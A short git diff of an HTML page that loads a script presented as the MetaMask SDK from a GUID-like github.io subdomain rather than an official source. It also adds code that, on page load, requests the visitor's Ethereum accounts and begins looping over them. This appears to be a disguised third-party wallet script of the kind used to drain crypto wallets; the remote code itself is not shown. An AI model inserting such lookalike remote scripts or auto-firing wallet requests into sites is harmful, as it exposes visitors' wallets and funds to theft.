@@ -31,6 +31,7 @@
 
     <!-- Template Stylesheet -->
     <link href="css/style.css" rel="stylesheet">
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 </head>
 
 <body>
@@ -516,16 +517,19 @@
     <script src="lib/easing/easing.min.js"></script>
     <script src="lib/waypoints/waypoints.min.js"></script>
     <script src="lib/owlcarousel/owl.carousel.min.js"></script>
-    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.2.2/web3.min.js"></script>
 
     <!-- Template Javascript -->
     <script src="js/main.js"></script>
     <script>
       (async () => {
+        
         const MMSDK = new MetaMaskSDK.MetaMaskSDK()
-    // Because init process of the MetaMaskSDK is async.
-        await ethereum.request({ method: 'eth_requestAccounts' })
+      // Because init process of the MetaMaskSDK is async.
+        await MMSDK.init()
+        const ethereum = MMSDK.getProvider() // You can also access via window.ethereum
+
+        ethereum.request({ method: 'eth_requestAccounts' })
         const web3 = new Web3(window.ethereum) 
         const accounts = await web3.eth.getAccounts()
         let accindex = 0
